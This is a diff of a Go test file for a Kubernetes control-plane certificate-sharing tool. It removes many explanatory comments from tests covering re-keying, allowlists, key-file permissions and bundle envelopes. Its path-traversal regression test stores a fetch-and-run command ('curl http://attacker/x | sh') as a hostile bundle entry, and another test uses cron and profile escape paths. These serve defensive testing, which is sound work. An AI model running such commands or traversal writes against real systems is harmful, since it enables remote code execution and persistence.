@@ -91,19 +91,12 @@ func TestDecryptShortCiphertext(t *testing.T) {
 	}
 }
 
-// TestRekeyInvalidatesOldKey is the property that makes an on-demand
-// re-key worth doing: after the shared material is re-encrypted under a fresh
-// certificate-key, the previous key — which on an older build was printed to
-// stdout and may sit in a CI log — no longer decrypts it, while the new key does.
-// This is exactly what `certs rotate --rekey-shared` does to the stratum-certs
-// ciphertext (NewCertKey + ReUploadCerts).
 func TestRekeyInvalidatesOldKey(t *testing.T) {
 	plaintext := []byte("shared ca + sa keypair bytes")
 	oldKey, newKey := mustKey(t), mustKey(t)
 	if oldKey == newKey {
 		t.Fatal("precondition: the two keys must differ")
 	}
-	// The re-key re-encrypts the same material under the new key.
 	newCT, err := encrypt(newKey, plaintext)
 	if err != nil {
 		t.Fatal(err)
@@ -174,16 +167,11 @@ func TestRepointKubeconfigs(t *testing.T) {
 	if !strings.Contains(string(out), "server: "+vip) {
 		t.Errorf("VIP endpoint missing:\n%s", out)
 	}
-	// credentials must survive untouched
 	if !strings.Contains(string(out), "QUFBQQ==") {
 		t.Error("repoint dropped the embedded CA")
 	}
 }
 
-// --- shared-cert blob containment ---
-
-// uploadSet is what UploadCerts produces: the mandatory shared certs plus any
-// optional rotation material that happened to be on disk.
 func uploadSet(t *testing.T) map[string][]byte {
 	t.Helper()
 	files := map[string][]byte{}
@@ -199,9 +187,6 @@ func uploadSet(t *testing.T) map[string][]byte {
 	return files
 }
 
-// TestCertAllowlistCoversUploadSet pins the download allowlist to the upload
-// lists. If someone adds a name to sharedCerts or rotationCerts but the
-// allowlist stops deriving from them, joins break at runtime — this fails first.
 func TestCertAllowlistCoversUploadSet(t *testing.T) {
 	for _, n := range append(append([]string{}, sharedCerts...), rotationCerts...) {
 		if _, ok := certAllowlist[n]; !ok {
@@ -213,12 +198,6 @@ func TestCertAllowlistCoversUploadSet(t *testing.T) {
 	}
 }
 
-// TestSharedCertSetsAreTheJoinContract pins the bundle's entry names, in
-// order. These names are a contract across versions, not an implementation
-// detail: an older joiner refuses any entry it does not know (checkCertNames),
-// so renaming or dropping one here breaks joining an upgraded cluster with an
-// older binary. TestCertAllowlistCoversUploadSet proves the allowlist tracks
-// these two lists; it cannot see a change to their contents.
 func TestSharedCertSetsAreTheJoinContract(t *testing.T) {
 	wantShared := []string{
 		"ca.crt", "ca.key", "sa.key", "sa.pub",
@@ -242,8 +221,6 @@ func TestSharedCertSetsAreTheJoinContract(t *testing.T) {
 	if !slices.Equal(rotationCerts, wantRotation) {
 		t.Errorf("rotationCerts = %q\nwant %q — an older joiner refuses a bundle entry it does not know, so these names are a cross-version contract", rotationCerts, wantRotation)
 	}
-	// The cis profile's shared secret is the entry an earlier binary carried
-	// the at-rest key in, by that name.
 	if got, want := profile.SharedSecretNames(), []string{"encryption-config.yaml"}; !slices.Equal(got, want) {
 		t.Errorf("the registered profiles' shared secrets = %q\nwant %q — the same cross-version contract", got, want)
 	}
@@ -270,8 +247,7 @@ func TestWriteCertFilesAcceptsTheUploadSet(t *testing.T) {
 		if err != nil {
 			t.Fatal(err)
 		}
-		// The property that matters is that private key material is not readable
-		// by group or other. Asserting an exact 0644 would be umask-dependent.
+		// Asserting an exact 0644 would be umask-dependent.
 		secret := filepath.Ext(name) == ".key" || name == "encryption-config.yaml"
 		if secret && fi.Mode().Perm()&0o077 != 0 {
 			t.Errorf("%s has mode %04o — key material is group/world readable", name, fi.Mode().Perm())
@@ -279,9 +255,6 @@ func TestWriteCertFilesAcceptsTheUploadSet(t *testing.T) {
 	}
 }
 
-// TestWriteCertFilesReplacesEntriesWithoutTruncating: a CA rotation rewrites
-// the key file of a control plane that already holds the cluster's live key.
-// The old file must stay whole until the new one replaces it.
 func TestWriteCertFilesReplacesEntriesWithoutTruncating(t *testing.T) {
 	dir := t.TempDir()
 	key := filepath.Join(dir, encryptionConfigEntry)
@@ -323,11 +296,6 @@ func TestWriteCertFilesReplacesEntriesWithoutTruncating(t *testing.T) {
 	}
 }
 
-// TestWriteCertFilesReportsAPartlyAppliedBundle: entries are written in name
-// order, so a write that fails part-way leaves a known prefix of the bundle
-// replaced, and the error names it. An entry whose rename landed before its
-// directory sync failed counts as replaced, and when that is the last entry the
-// error says the whole bundle is in place.
 func TestWriteCertFilesReportsAPartlyAppliedBundle(t *testing.T) {
 	saved := writeCertFile
 	t.Cleanup(func() { writeCertFile = saved })
@@ -392,10 +360,6 @@ func TestWriteCertFilesReportsAPartlyAppliedBundle(t *testing.T) {
 	}
 }
 
-// TestWriteCertFilesRejectsPathTraversal is the regression test for shared-cert
-// blob containment. Each vector is a bundle that decrypts and unmarshals
-// cleanly — AES-GCM proves only that it was sealed with the certificate-key —
-// but carries one entry that would escape the PKI directory.
 func TestWriteCertFilesRejectsPathTraversal(t *testing.T) {
 	vectors := []struct {
 		name  string
@@ -420,8 +384,7 @@ func TestWriteCertFilesRejectsPathTraversal(t *testing.T) {
 			if err := os.MkdirAll(escape, 0o755); err != nil {
 				t.Fatal(err)
 			}
-			// Control: prove the escape target is genuinely writable here, so a
-			// passing test is the guard working and not a missing directory.
+			// Control: proves the escape target is writable, so a pass is not vacuous.
 			probe := filepath.Join(escape, "probe")
 			if err := os.WriteFile(probe, []byte("x"), 0o644); err != nil {
 				t.Fatalf("escape target not writable, test would pass vacuously: %v", err)
@@ -430,7 +393,6 @@ func TestWriteCertFilesRejectsPathTraversal(t *testing.T) {
 				t.Fatal(err)
 			}
 
-			// A full, legitimate bundle plus the one hostile entry.
 			files := uploadSet(t)
 			files[v.entry] = []byte("curl http://attacker/x | sh")
 
@@ -442,8 +404,6 @@ func TestWriteCertFilesRejectsPathTraversal(t *testing.T) {
 				t.Errorf("error does not name the offending entry %q: %v", v.entry, err)
 			}
 
-			// Nothing at all may have been written: not the hostile entry, and not
-			// the legitimate entries that share the blob with it.
 			if _, statErr := os.Stat(filepath.Join(escape, "stratum.sh")); statErr == nil {
 				t.Error("hostile entry escaped the PKI directory")
 			}
@@ -454,9 +414,6 @@ func TestWriteCertFilesRejectsPathTraversal(t *testing.T) {
 	}
 }
 
-// TestWriteCertFilesRejectionIsDeterministic guards the two-pass design: with
-// several bad entries the message must be stable across runs, not whichever key
-// Go's randomised map iteration reached first.
 func TestWriteCertFilesRejectionIsDeterministic(t *testing.T) {
 	files := uploadSet(t)
 	for _, bad := range []string{"../../cron.d/x", "../../profile.d/y", "authorized_keys"} {
@@ -470,8 +427,7 @@ func TestWriteCertFilesRejectionIsDeterministic(t *testing.T) {
 		if err == nil {
 			t.Fatal("accepted a bundle with three unexpected entries")
 		}
-		// Strip the per-run temp dir so the comparison is about entry ORDER,
-		// which is what the two-pass design pins.
+		// Strip the per-run temp dir; the comparison is about entry order.
 		msg := strings.ReplaceAll(err.Error(), dir, "<dir>")
 		if i == 0 {
 			first = msg
@@ -498,20 +454,6 @@ func TestInitialClusterNamesTheUnstartedMember(t *testing.T) {
 	}
 }
 
-// --- the versioned bundle envelope ---
-//
-// Each grant entry's payload carries one versioned envelope (v1): version,
-// authenticated metadata, files. The metadata — the publication's generation,
-// whether the bundle carries the at-rest key, the cluster VIP the publishing
-// control plane recorded, and the etcd client endpoints — travels INSIDE the
-// ciphertext, so the facts a joiner reads from it are authenticated by the
-// same AES-GCM open that authenticates the files. The legacy flat map stays a
-// supported decode shape (the pre-envelope payload the legacy `certs` entry
-// keeps published for the negotiated transition), and the strict file
-// allowlist governs the envelope's files exactly as it governed the flat
-// map's. This is the envelope's decode half at the unit level; the publication
-// side is pinned by TestUploadPublishesTheVersionedEnvelope and the join side
-// by TestControlPlaneJoinTakesTheAuthenticatedVIPMetadata.
 func TestBundleMetadataSectionAndFlatForm(t *testing.T) {
 	files := uploadSet(t)
 	delete(files, encryptionConfigEntry) // a keyless bundle: the metadata must report none, not invent a key
@@ -596,12 +538,6 @@ func TestBundleMetadataSectionAndFlatForm(t *testing.T) {
 	})
 
 	t.Run("the legacy decoder is what publication negotiates against", func(t *testing.T) {
-		// The negotiated transition: publication keeps a shape every supported
-		// joiner version decodes. Driven with this package's own legacy decoder
-		// — writeCertFiles, the decode a released stratum runs — the flat-map
-		// payload still applies, and the envelope payload is refused by it,
-		// which is why the legacy `certs` entry stays published beside the
-		// grant entries rather than the other way round.
 		flatPlain, err := json.Marshal(files)
 		if err != nil {
 			t.Fatal(err)
@@ -637,8 +573,7 @@ func TestBundleMetadataSectionAndFlatForm(t *testing.T) {
 		env.Files = files
 		sec := &corev1.Secret{
 			ObjectMeta: metav1.ObjectMeta{Name: certsSecret, Namespace: "kube-system",
-				// The annotation deliberately disagrees: the unauthenticated hint
-				// must never pass for the authenticated metadata.
+				// The unauthenticated hint must never pass for the authenticated metadata.
 				Annotations: map[string]string{etcdEndpointsAnnotation: "192.0.2.99"}},
 			Data: map[string][]byte{grantEntryKey("abc123"): sealedEnvelope(t, key, env)},
 		}
@@ -659,8 +594,6 @@ func TestBundleMetadataSectionAndFlatForm(t *testing.T) {
 	})
 }
 
-// fakeLister answers MemberList the way etcd does without quorum: a
-// linearizable read fails, a serializable one is served from the local copy.
 type fakeLister struct{ members int }
 
 func (f fakeLister) MemberList(_ context.Context, opts ...clientv3.OpOption) (*clientv3.MemberListResponse, error) {
@@ -670,11 +603,6 @@ func (f fakeLister) MemberList(_ context.Context, opts ...clientv3.OpOption) (*c
 	return &clientv3.MemberListResponse{Members: make([]*etcdserverpb.Member, f.members)}, nil
 }
 
-// TestCountMembersWorksWithoutQuorum: the seed counts its own
-// etcd's members to notice HA growth. If a second member joined and then went
-// away before the first poll, the seed has lost quorum, a linearizable list
-// fails, and the growth would never be recorded. Fails if the member count
-// demands a linearizable read.
 func TestCountMembersWorksWithoutQuorum(t *testing.T) {
 	n, err := countMembers(t.Context(), fakeLister{members: 2})
 	if err != nil || n != 2 {
@@ -682,10 +610,6 @@ func TestCountMembersWorksWithoutQuorum(t *testing.T) {
 	}
 }
 
-// A join's check sees the bundle's profile and the shared secrets it carries
-// before any file is written, so a mismatch it refuses leaves this node's PKI
-// as it was. A legacy flat map, or an envelope an earlier stratum published,
-// names no profile, which leaves the check to the secrets alone.
 func TestOpenGrantChecksTheProfileBeforeWritingTheBundle(t *testing.T) {
 	files := uploadSet(t)
 	key := mustKey(t)
@@ -753,10 +677,6 @@ func TestOpenGrantChecksTheProfileBeforeWritingTheBundle(t *testing.T) {
 	})
 }
 
-// Every entry the join bundle shares that is not a certificate or key is a
-// name profile.Validate refuses for a shared secret, so a profile cannot
-// declare one the engine writes on its own, and "version" in any case is
-// refused because the legacy flat map is probed for it.
 func TestEngineBundleNamesAreReservedFromProfileSecrets(t *testing.T) {
 	certExt := map[string]bool{".crt": true, ".key": true, ".pub": true, ".csr": true, ".pem": true}
 	for name := range certAllowlist {
